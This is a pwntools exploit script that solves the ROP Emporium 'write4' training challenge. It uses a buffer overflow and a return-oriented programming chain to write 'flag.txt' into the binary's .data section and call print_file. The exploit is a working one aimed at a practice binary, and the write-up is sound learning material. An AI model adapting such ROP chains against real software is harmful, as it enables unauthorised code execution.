'''
Exploit by: maki

References:
https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
https://ropemporium.com/challenge/write4.html

'''
from pwn import *

p = process("./write4")

junk = 40*b"A"

mov_reg_reg = 0x400628 #0x0000000000400628 : mov qword ptr [r14], r15 ; ret
pop_reg = 0x400690 #0x0000000000400690 : pop r14 ; pop r15 ; ret
pop_rdi = 0x400693 #0x0000000000400693 : pop rdi ; ret

data = 0x601028 #gdb info files: 0x0000000000601028 - 0x0000000000601038 is .data | objdump: 0000000000601028 <__data_start>:
string = 0x7478742e67616c66 # "flag.txt" -> txt.galf -> \x74\x78\x74\x2e\x67\x61\x6c\x66 (exactly 8 bytes)

print_file = 0x400620 #400620:	e8 eb fe ff ff       	call   400510 <print_file@plt>

payload = junk

payload += p64(pop_reg)
payload += p64(data)
payload += p64(string)
payload += p64(mov_reg_reg)

payload += p64(pop_rdi)
payload += p64(data)
payload += p64(print_file)

p.sendline(payload)
p.interactive()
